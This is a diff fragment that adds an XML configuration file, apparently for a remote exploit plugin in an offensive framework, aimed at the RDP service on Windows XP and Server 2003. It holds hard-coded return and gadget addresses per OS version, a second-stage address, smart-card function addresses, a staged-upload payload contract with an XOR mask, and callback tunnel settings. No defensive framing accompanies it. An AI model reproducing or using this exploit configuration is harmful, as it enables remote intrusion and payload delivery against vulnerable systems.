+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0x0fdbbe19</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x0fdbd72d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0FF5E2B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0fda43fa</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x0fdb9c6d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FDC9A70</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF5D170</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FDA1388</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FDA1370</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Other|64' description="Other languages' 64-bit XP/2003">
+            <parameter hidden='true' type='U32' name='GlobalBufAddr' description=''>
+              <default>0x0FDA9870</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret0c' description=''>
+              <default>0x0FD9E483</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret10' description=''>
+              <default>0x0FDA28CC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret04' description=''>
+              <default>0x0FD90EDC</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret08' description=''>
+              <default>0x0FDA2BE7</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret20' description=''>
+              <default>0x0FD9C9C9</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret28' description=''>
+              <default>0x0fd9be19</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret40' description=''>
+              <default>0x00004000</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='ret44' description=''>
+              <default>0x0fd9d72d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sysenterIndex' description=''>
+              <default>0x0FF3E2B0</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='jmpEbx' description=''>
+              <default>0x0fd843fa</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='sizeOffest' description=''>
+              <default>0x0fd99c6d</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='secondStageAddress' description=''>
+              <default>0x0FDA9A70</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='provContAddress' description=''>
+              <default>0x0FF3D170</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardTransmitAddress' description=''>
+              <default>0x0FD81388</default>
+            </parameter>
+            <parameter hidden='true' type='U32' name='scardT0PciAddress' description=''>
+              <default>0x0FD81370</default>
+            </parameter>
+          </paramgroup>
+        </paramchoice>
+      </paramgroup>
+    </paramchoice>
+  </inputparameters>
+  <outputparameters>
+    <paramchoice name='Contract' description='The contract fulfilled by this plugin'>
+      <value>StagedUpload</value>
+      <paramgroup name='StagedUpload' description=''>
+        <parameter type='Socket' name='ConnectedTcp' description='The connected socket'/>
+        <parameter type='U8' name='XorMask' description='Masking byte'/>
+      </paramgroup>
+    </paramchoice>
+  </outputparameters>
+  <redirection>
+    <local protocol='TCP' name='Launch Tunnel' listenport='TargetPort' listenaddr='TargetIp' closeoncompletion='true' destaddr='TargetIp' destport='TargetPort'/>
+    <local protocol='TCP' name='Callin Tunnel' listenport='CallinPort' listenaddr='TargetIp' closeoncompletion='false' destaddr='TargetIp' destport='ListenPort'/>
+    <remote listenport='CallbackPort' protocol='TCP' name='Callback Tunnel' listenaddr='CallbackIp' destport='CallbackLocalPort'/>
+  </redirection>
+  <logic>
+    <and>
+      <service name='rdp'>
+        <bindtopath path="//service[name='rdp']/port" name='TargetPort'/>
+      </service>
+      <or>
+        <os servicepack='0' name='Windows XP' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='XPSP0'/>
+        </os>
+        <os servicepack='1' name='Windows XP' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='XPSP1'/>
+        </os>
+        <os servicepack='1' name='Windows XP' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='XPSP0|1'/>
+        </os>
+        <os servicepack='2' name='Windows XP' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='XPSP2'/>
+        </os>
+        <os servicepack='3' name='Windows XP' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='XPSP3'/>
+        </os>
+        <os servicepack='3' name='Windows XP' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='XPSP2|3'/>
+        </os>
+        <os servicepack='0' name='Windows 2003' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='W2K3SP0'/>
+        </os>
+        <os servicepack='1' name='Windows 2003' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='W2K3SP1'/>
+        </os>
+        <os servicepack='2' name='Windows 2003' family='windows' architecture='x86 32-bit'>
+          <bindtovalue name='Target' value='W2K3SP2'/>
+        </os>
+        <os servicepack='0' name='Windows XP' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+        <os servicepack='1' name='Windows XP' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+        <os servicepack='2' name='Windows XP' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+        <os servicepack='3' name='Windows XP' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+        <os servicepack='0' name='Windows 2003' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+        <os servicepack='1' name='Windows 2003' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+        <os servicepack='2' name='Windows 2003' family='windows' architecture='x86 64-bit'>
+          <bindtovalue name='Target' value='XP|2K3|64'/>
+        </os>
+      </or>
+      <bindtopath path='//identifier' name='TargetIp'/>
+      <bindtovalue name='Payload' value='Callback'/>
+    </and>
+  </logic>
+</config>
